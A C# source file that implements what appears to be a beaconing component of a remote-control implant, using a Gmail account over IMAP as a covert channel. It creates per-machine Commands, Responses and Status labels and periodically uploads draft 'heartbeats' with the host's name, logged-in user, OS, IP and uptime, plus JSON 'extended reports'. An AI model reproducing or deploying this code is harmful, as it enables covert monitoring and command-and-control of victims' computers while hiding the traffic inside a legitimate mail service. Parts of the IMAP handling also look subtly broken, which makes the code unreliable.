using System;
using System.Configuration;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;

public class ImapGmailClient
{
    private readonly string _user;
    private readonly string _password;
    private TcpClient _client;
    private SslStream _stream;
    private string _baseLabel;
    private string _statusDraftId;
    private int _tagCounter = 1;

    public ImapGmailClient()
    {
        _user = ConfigurationManager.AppSettings["Gmail:Username"];
        _password = ConfigurationManager.AppSettings["Gmail:Password"];
        Log($"Initialized with user: {_user}");
    }

    public void Initialize()
    {
        Log("Starting initialization...");
        Connect();

        var currentUser = GetCurrentLoggedUser();
        _baseLabel = $"{Environment.MachineName}_{currentUser}";
        Log($"Base label: {_baseLabel}");

        EnsureLabelStructure();
        InitializeStatusDraft();
        Log("Initialization complete");
    }

    private void Connect()
    {
        Log("Connecting to IMAP...");
        _client = new TcpClient("imap.gmail.com", 993);
        _stream = new SslStream(_client.GetStream());
        _stream.AuthenticateAsClient("imap.gmail.com");

        var welcome = ReadResponse();
        Log($"Server: {welcome.Substring(0, Math.Min(100, welcome.Length))}");

        SendCommand($"LOGIN {_user} {_password}");
        Log("Login successful");
    }

    private string GetCurrentLoggedUser()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(
                "SELECT UserName FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var fullName = obj["UserName"]?.ToString();
                    var user = fullName?.Split('\\').Last() ?? Environment.UserName;
                    Log($"Current user: {user}");
                    return user;
                }
            }
        }
        catch (Exception ex)
        {
            Log($"WMI user query failed: {ex.Message}");
        }

        return Environment.UserName;
    }

    private void EnsureLabelStructure()
    {
        Log("Creating label structure...");
        var labels = new[]
        {
            _baseLabel,
            $"{_baseLabel}/Commands",
            $"{_baseLabel}/Responses",
            $"{_baseLabel}/Status"
        };

        foreach (var label in labels)
        {
            Log($"Creating: {label}");
            SendCommand($"CREATE \"{label}\"");
        }
        Log("Labels created");
    }

    private void InitializeStatusDraft()
    {
        Log("Creating status draft...");
        var today = DateTime.Now.ToString("yyyy-MM-dd");
        var content = BuildStatusEmail(today, DateTime.Now);

        SendCommand($"APPEND \"[Gmail]/Drafts\" (\\Draft) {{{content.Length}}}");
        SendRaw(content);

        _statusDraftId = GetLatestDraftId();
        Log($"Status draft ID: {_statusDraftId}");
    }

    public void UpdateHeartbeat()
    {
        if (_statusDraftId == null)
        {
            Log("No draft ID for heartbeat");
            return;
        }

        Log("Updating heartbeat...");
        var today = DateTime.Now.ToString("yyyy-MM-dd");
        var content = BuildStatusEmail(today, DateTime.Now);

        SendCommand("SELECT \"[Gmail]/Drafts\"");
        SendCommand($"STORE {_statusDraftId} +FLAGS (\\Deleted)");
        SendCommand("EXPUNGE");

        SendCommand($"APPEND \"[Gmail]/Drafts\" (\\Draft) {{{content.Length}}}");
        SendRaw(content);

        _statusDraftId = GetLatestDraftId();
        Log($"Heartbeat updated, new draft: {_statusDraftId}");
    }

    public void SendExtendedReport(string json)
    {
        Log("Sending extended report...");
        var email = BuildEmail(
            $"[EXTENDED] {DateTime.Now:yyyy-MM-dd HH:mm:ss}",
            json,
            $"{_baseLabel}/Responses"
        );

        SendCommand($"APPEND \"{_baseLabel}/Responses\" {{{email.Length}}}");
        SendRaw(email);
        Log("Extended report sent");
    }

    private string BuildStatusEmail(string firstStartDate, DateTime lastHeartbeat)
    {
        var sb = new StringBuilder();
        var info = CollectSystemInfo();

        sb.AppendLine($"From: {_user}");
        sb.AppendLine($"To: {_user}");
        sb.AppendLine($"Subject: [STATUS] {Environment.MachineName}");
        sb.AppendLine($"Date: {DateTime.UtcNow:R}");
        sb.AppendLine($"X-Gmail-Labels: {_baseLabel}/Status");
        sb.AppendLine();
        sb.AppendLine($"First Start: {firstStartDate}");
        sb.AppendLine($"Last Heartbeat: {lastHeartbeat:yyyy-MM-dd HH:mm:ss}");
        sb.AppendLine();
        sb.AppendLine(info);

        return sb.ToString();
    }

    private string BuildEmail(string subject, string body, string label)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"From: {_user}");
        sb.AppendLine($"To: {_user}");
        sb.AppendLine($"Subject: {subject}");
        sb.AppendLine($"Date: {DateTime.UtcNow:R}");
        sb.AppendLine($"X-Gmail-Labels: {label}");
        sb.AppendLine();
        sb.AppendLine(body);
        return sb.ToString();
    }

    private string CollectSystemInfo()
    {
        var sb = new StringBuilder();

        sb.AppendLine($"Machine: {Environment.MachineName}");
        sb.AppendLine($"User: {GetCurrentLoggedUser()}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"IP: {GetPrimaryIp()}");
        sb.AppendLine($"Uptime: {GetUptime():F1}h");

        return sb.ToString();
    }

    private string GetPrimaryIp()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == OperationalStatus.Up)
            .SelectMany(n => n.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
            .Select(a => a.Address.ToString())
            .FirstOrDefault() ?? "0.0.0.0";
    }

    private double GetUptime()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(
                "SELECT LastBootUpTime FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var bootTime = ManagementDateTimeConverter.ToDateTime(
                        obj["LastBootUpTime"].ToString());
                    return (DateTime.Now - bootTime).TotalHours;
                }
            }
        }
        catch { }

        return 0;
    }

    private string GetLatestDraftId()
    {
        SendCommand("SELECT \"[Gmail]/Drafts\"");
        SendCommand("SEARCH ALL");

        var response = ReadResponse();
        var parts = response.Split(' ');
        return parts.Length > 2 ? parts[parts.Length - 1].Trim() : "1";
    }

    private void SendCommand(string command)
    {
        var tag = $"A{_tagCounter++:D3}";
        var fullCommand = $"{tag} {command}";
        Log($">> {fullCommand}");

        var data = Encoding.ASCII.GetBytes(fullCommand + "\r\n");
        _stream.Write(data, 0, data.Length);

        var response = ReadResponse();
        Log($"<< {response.Substring(0, Math.Min(200, response.Length))}");
    }

    private void SendRaw(string data)
    {
        Log($">> RAW ({data.Length} bytes)");
        var bytes = Encoding.UTF8.GetBytes(data + "\r\n");
        _stream.Write(bytes, 0, bytes.Length);
        ReadResponse();
    }

    private string ReadResponse()
    {
        var buffer = new byte[8192];
        var bytesRead = _stream.Read(buffer, 0, buffer.Length);
        return Encoding.ASCII.GetString(buffer, 0, bytesRead);
    }

    private void Log(string message)
    {
        var log = $"[IMAP {DateTime.Now:HH:mm:ss}] {message}";
#if DEBUG
        Console.WriteLine(log);
#endif
        Debug.WriteLine(log);
    }
}
